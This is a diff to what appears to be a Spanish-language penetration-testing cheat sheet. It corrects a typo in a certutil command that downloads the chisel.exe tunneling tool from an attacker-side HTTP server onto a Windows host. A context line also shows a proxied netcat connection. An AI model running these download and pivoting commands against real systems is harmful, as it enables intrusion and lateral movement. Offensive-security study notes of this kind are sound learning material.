@@ -688,7 +688,7 @@ proxychains rlwrap nc 10.10.10.6 -p 10000
 #### 6.7.5. Descargar un archivo desde Windows
 
 ```powershell
-ceretutil -split -urlcache -f http://192.168.1.10/chisel.exe chisel.exe
+certutil -split -urlcache -f http://192.168.1.11/chisel.exe chisel.exe
 ```
 
 ### 7. Explotación Web
